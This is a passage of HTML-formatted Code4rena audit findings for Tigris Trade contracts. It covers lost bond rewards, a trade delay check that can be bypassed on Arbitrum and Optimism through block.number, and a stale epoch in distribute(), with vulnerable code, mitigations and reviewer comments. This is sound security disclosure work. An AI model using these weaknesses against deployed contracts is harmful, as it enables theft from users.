class=\"mtk7\">177</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expired</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pendingDelta</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">accRewardsPerShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">]] / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">bondPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">]) - (</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">accRewardsPerShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk1\">-</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">bondPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:                 </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">accRewardsPerShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">]] += </span><span class=\"mtk12\">_pendingDelta</span><span class=\"mtk1\">*</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">/</span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:                 }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">bondPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Users can claim rewards up to the expiry time, based on <code>accRewardsPerShare[tigAsset][bond.expireEpoch-1]</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">235</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">idToBond</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">Bond</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">238</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expired</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">] ? </span><span class=\"mtk4\">true</span><span class=\"mtk1\"> : </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">239</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_accRewardsPerShare</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accRewardsPerShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expired</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk1\">-</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pending</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_accRewardsPerShare</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">bondPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/392#issuecomment-1377671576\">TriHaz (Tigris Trade) acknowledged, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Acknowledged, we cant redistribute past rewards accurately because it would cost too much gas.</p>\n<p>I would downgrade it to Medium risk, needs an opinion from judge.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/392#issuecomment-1399436419\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to how epochs are handled, some rewards could be lost unless claimed each epoch.</p>\n<p>Because the finding pertains to a loss of Yield, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/392#issuecomment-1407761754\">GainsGoblin (Tigris Trade) commented</a>:</strong></p>\n<blockquote>\n<p>It is not feasible to update accRewardsPerShare for every epoch during which bond was expired. This issue is mitigated by the fact that anyone can release an expired bond, so the small difference in yield shouldn’t affect users that much.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-15-_checkdelay-will-not-work-properly-for-arbitrum-or-optimism-due-to-blocknumber-\" style=\"position:relative;\"><a href=\"#m-15-_checkdelay-will-not-work-properly-for-arbitrum-or-optimism-due-to-blocknumber-\" aria-label=\"m 15 _checkdelay will not work properly for arbitrum or optimism due to blocknumber  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/419\">[M-15] <code>_checkDelay</code> will not work properly for Arbitrum or Optimism due to <code>block.number</code> </a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/419\">0x52</a></em></p>\n<p>Trade delay will not work correctly on Arbitrum allowing users to exploit multiple valid prices.</p>\n<h3 id=\"proof-of-concept-25\" style=\"position:relative;\"><a href=\"#proof-of-concept-25\" aria-label=\"proof of concept 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _checkDelay(uint _id, bool _type) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Delay memory _delay = blockDelayPassed[_id];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //in those situations</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_delay.actionType == _type) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            blockDelayPassed[_id].delay = block.number + blockDelay;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (block.number &lt; _delay.delay) revert(&quot;0&quot;); //Wait</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            blockDelayPassed[_id].delay = block.number + blockDelay;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            blockDelayPassed[_id].actionType = _type;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p><code>\\_checkDelay</code> enforces a delay of a specific number of block between opening and closing a position. While this structure will work on mainnet, it is problematic for use on Arbitrum. </p>\n<p>According to Arbitrum <a href=\"https://developer.offchainlabs.com/time\">Docs</a> <code>block.number</code> returns the most recently synced L1 block number. Once per minute the block number in the Sequencer is synced to the actual L1 block number. This period could be abused to completely bypass this protection. </p>\n<p>The user would open their position 1 Arbitrum block before the sync happens, then close it the very next block. It would appear that there has been 5 blocks (60 / 12) since the last transaction but in reality it has only been 1 Arbitrum block. Given that Arbitrum has 2 seconds blocks it would be impossible to block this behavior through parameter changes.</p>\n<p>It also presents an issue for <a href=\"https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps\">Optimism</a> because each transaction is it’s own block. No matter what value is used for the block delay, the user can pad enough tiny transactions to allow them to close the trade immediately.</p>\n<h3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The delay should be measured using <code>block.timestamp</code> rather than <code>block.number</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/419#issuecomment-1372885915\">TriHaz (Tigris Trade) disputed and commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>Once per minute the block number in the Sequencer is synced to the actual L1 block number.</p>\n</blockquote>\n<p>That is changed after Nitro upgrade.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/419#issuecomment-1387095679\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>@TriHaz I’d like to flag this issue with the following notes:\nblock.number will return the latest synched block number from L1, this can be stale.</p>\n<p>Per <a href=\"https://developer.offchainlabs.com/time\">the docs</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">As a general rule, any timing assumptions a contract makes about block numbers and timestamps should be considered generally reliable in the longer term (i.e., on the order of at least several hours) but unreliable in the shorter term (minutes). (It so happens these are generally the same assumptions one should operate under when using block numbers directly on Ethereum!)</span></span></code></pre>\n<p>From a trusted Arbitrum Dev:\n<code>using block.number is generally fine if you want to measure time, since that will roughly follow L1 block time</code></p>\n<p>So ultimately this is dependent on how big or small of a delay is required.</p>\n<p>For minutes to hours, there seems to be no risk, while for shorter timeframes, some risk is possible.</p>\n<p>In terms of impact, the main impact would be that an operation that would be expected to be executed 12 seconds later, could actually be executed as rapidly as 1 or 2 seconds after (if we assume that one L2 block goes from number A to B).</p>\n<p>I don’t think the finding can be categorized High Severity due to the reliance on settings and intentions, but at this point I believe the finding is valid and am thinking it should be of Medium Severity as it may break expectations (e.g. being able to use the same oracle price in 2 separate blocks due to unexpectedly small timestamp differences), but this is reliant on an external condition.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/419#issuecomment-1399439675\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I have also recently checked Optimism Docs, in anticipation of the Bedrock upgrade.</p>\n<p>Very notable warning\n<img width=\"832\" alt=\"Screenshot 2023-01-22 at 10 32 48\" src=\"https://user-images.githubusercontent.com/13383782/213909047-2793d041-757d-4ed8-b0c0-458e86fbe582.png\"></p>\n<p>Source: <a href=\"https://community.optimism.io/docs/developers/bedrock/how-is-bedrock-different/\">https://community.optimism.io/docs/developers/bedrock/how-is-bedrock-different/</a></p>\n<p>Leading me to further agree with the risk involved with the finding, at this time I believe <code>block.timestamp</code> to be a better tool for all L2 integrations.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/419#issuecomment-1407767535\">GainsGoblin (Tigris Trade) confirmed and resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176100\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176100</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"m-16-distribute-wont-update-epochtigasset-when-totalsharestigasset0-which-can-cause-later-created-bond-for-this-tigasset-to-have-wrong-mint-epoch\" style=\"position:relative;\"><a href=\"#m-16-distribute-wont-update-epochtigasset-when-totalsharestigasset0-which-can-cause-later-created-bond-for-this-tigasset-to-have-wrong-mint-epoch\" aria-label=\"m 16 distribute wont update epochtigasset when totalsharestigasset0 which can cause later created bond for this tigasset to have wrong mint epoch permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/436\">[M-16] <code>distribute()</code> won’t update <code>epoch[tigAsset]</code> when <code>totalShares[tigAsset]==0</code> which can cause later created bond for this tigAsset to have wrong mint epoch</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/436\">unforgiven</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L206-L228\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L206-L228</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L48-L86\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L48-L86</a></p>\n<h3 id=\"impact-10\" style=\"position:relative;\"><a href=\"#impact-10\" aria-label=\"impact 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Function <code>BondNFT.createLock()</code> creates a bond and it sets bond’s mint epoch as <code>epoch[asset]</code>. Function <code>Lock.lock()</code> first calls <code>claimGovFees()</code> which calls <code>BondNFT.distribute()</code> for all assets and updates the <code>epoch[assets]</code> for all assets. So during normal bond creation, the value of <code>epoch[asset]</code> would be updated and bond would be created from <code>today</code> epoch to <code>today+period</code> epoch. But if <code>totalShares[tigAsset] == 0</code> for an asset, then <code>distribute()</code> won’t update <code>epoch[asset]</code> for that asset and <code>epoch[asset]</code> will be some old epoch(will be the start time where asset is added or the time where <code>totalShares[_tigAsset] != 0</code>). This would make <code>createLock()</code> set very wrong values for bond’s mint epoch when <code>totalShares[tigAsset] == 0</code>.</p>\n<p>This would happen for the first bond that has been created for that asset always and it will happen again if for some period <code>totalShares[asset]</code> become 0, then the next bond would have wrong mint epoch. or <code>setAllowedAsset(asset, false)</code>  has been called for that asset.</p>\n<h3 id=\"proof-of-concept-26\" style=\"position:relative;\"><a href=\"#proof-of-concept-26\" aria-label=\"proof of concept 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>distribute()</code> code in BondNFT contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function distribute(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _tigAsset,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint _amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint aEpoch = block.timestamp / DAY;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (aEpoch &gt; epoch[_tigAsset]) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                for (uint i=epoch[_tigAsset]; i&lt;aEpoch; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    epoch[_tigAsset] += 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit Distribution(_tigAsset, _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see when <code>totalShares[_tigAsset] == 0</code>, then the value of <code>epoch[_tigAsset]</code> won’t get updated to today. And there is no other logic in the code to update <code>epoch[tigAsset]</code>. So when <code>totalShares[_tigAsset] == 0</code>, then the value of the <code>epoch[tigAsset]</code> would be outdated. this would happen when an asset is recently added to the BondNFT assets or when there is no bond left.</p>\n<p>When this condition happens and a user calls <code>Lock.lock()</code> to create a bond, the <code>lock()</code> function would call <code>claimGovFees()</code> to update rewards in BondNFT but because for that asset the value of totalShares are 0, that asset <code>epoch[]</code> won’t get updated and in the <code>BondNFT.createLock()</code>, the wrong value would set as bond’s mint epoch.</p>\n<p>This is <code>Lock.lock()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function lock(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _asset,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint _amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint _period</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(_period &lt;= maxPeriod, &quot;MAX PERIOD&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(_period &gt;= minPeriod, &quot;MIN PERIOD&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(allowedAssets[_asset], &quot;!asset&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        claimGovFees();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IERC20(_asset).transferFrom(msg.sender, address(this), _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        totalLocked[_asset] += _amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bondNFT.createLock( _asset, _amount, _period, msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>And this is <code>BondNFT.createLock()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function createLock(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _asset,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint _amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint _period,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _owner</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external onlyManager() returns(uint id) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(allowedAsset[_asset], &quot;!Asset&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint shares = _amount * _period / 365;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint expireEpoch = epoch[_asset] + _period;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            id = ++totalBonds;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            totalShares[_asset] += shares;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            Bond memory _bond = Bond(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                id,             // id</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(0),     // owner</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _asset,         // tigAsset token</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _amount,        // tigAsset amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                epoch[_asset],  // mint epoch</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                block.timestamp,// mint timestamp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                expireEpoch,    // expire epoch</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                0,              // pending</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                shares,         // linearly scaling share of rewards</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _period,        // lock period</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                false           // is expired boolean</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _idToBond[id] = _bond;</span></span>\n<span class=\"grvsc-line\"><span 